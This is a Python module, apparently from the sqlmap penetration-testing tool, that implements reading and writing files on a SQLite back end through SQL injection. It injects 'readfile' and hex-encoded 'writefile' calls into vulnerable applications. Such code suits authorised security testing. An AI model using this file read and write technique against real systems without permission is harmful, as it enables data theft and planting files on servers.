#!/usr/bin/env python

"""
Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission
"""

from lib.core.common import singleTimeWarnMessage
from lib.core.data import kb
from lib.core.data import logger
from lib.core.decorators import cachedmethod
from lib.core.enums import CHARSET_TYPE
from lib.core.enums import EXPECTED
from lib.core.enums import PLACE
from lib.core.exception import SqlmapUnsupportedFeatureException
from lib.request import inject
from plugins.generic.filesystem import Filesystem as GenericFilesystem

class Filesystem(GenericFilesystem):
    @cachedmethod
    def _checkFunction(self, name):
        """
        Checks for the presence of a specific SQL function inside the back-end
        DBMS (e.g. 'readfile'/'writefile' from the non-core 'fileio' extension,
        as the sqlite3 command line client has those built in, while the host
        application usually doesn't)
        """

        return inject.checkBooleanExpression("(SELECT COUNT(*) FROM pragma_function_list WHERE name='%s')>0" % name)

    def nonStackedReadFile(self, remoteFile):
        if not self._checkFunction("readfile"):
            errMsg = "on SQLite it is not possible to read files without "
            errMsg += "the 'fileio' extension function 'readfile' being "
            errMsg += "available inside the back-end DBMS"
            raise SqlmapUnsupportedFeatureException(errMsg)

        if not kb.bruteMode:
            infoMsg = "fetching file: '%s'" % remoteFile
            logger.info(infoMsg)

        return inject.getValue("HEX(readfile('%s'))" % remoteFile, charsetType=CHARSET_TYPE.HEXADECIMAL)

    def stackedReadFile(self, remoteFile):
        return self.nonStackedReadFile(remoteFile)

    def nonStackedWriteFile(self, localFile, remoteFile, fileType, forceCheck=False):
        if not self._checkFunction("writefile"):
            errMsg = "on SQLite it is not possible to write files without "
            errMsg += "the 'fileio' extension function 'writefile' being "
            errMsg += "available inside the back-end DBMS"
            raise SqlmapUnsupportedFeatureException(errMsg)

        logger.debug("encoding file to its hexadecimal string value")

        fcEncodedList = self.fileEncode(localFile, "hex", True)
        fcEncodedStr = fcEncodedList[0][2:]
        fcEncodedStrLen = len(fcEncodedStr)

        if kb.injection.place == PLACE.GET and fcEncodedStrLen > 8000:
            warnMsg = "the injection is on a GET parameter and the file "
            warnMsg += "to be written hexadecimal value is %d " % fcEncodedStrLen
            warnMsg += "bytes, this might cause errors in the file "
            warnMsg += "writing process"
            logger.warning(warnMsg)

        debugMsg = "exporting the %s file content to file '%s'" % (fileType, remoteFile)
        logger.debug(debugMsg)

        # Note: 'unhex' (SQLite >= 3.41.0) keeps the write binary-safe; the hex
        # string survives sqlmap's string escaping (it becomes CHAR(...) of the
        # ASCII hex digits, which 'unhex' decodes back to the original bytes)
        if self._checkFunction("unhex"):
            content = "unhex('%s')" % fcEncodedStr
        else:
            warnMsg = "back-end DBMS does not have the 'unhex' function "
            warnMsg += "(SQLite >= 3.41.0); the file will be written from a "
            warnMsg += "textual value and non-ASCII bytes may get corrupted"
            singleTimeWarnMessage(warnMsg)

            with open(localFile, "rb") as f:
                content = "'%s'" % f.read().decode("latin-1")

        inject.getValue("writefile('%s',%s)" % (remoteFile, content), expected=EXPECTED.INT, charsetType=CHARSET_TYPE.DIGITS)

        return self.askCheckWrittenFile(localFile, remoteFile, forceCheck)

    def stackedWriteFile(self, localFile, remoteFile, fileType, forceCheck=False):
        return self.nonStackedWriteFile(localFile, remoteFile, fileType, forceCheck)
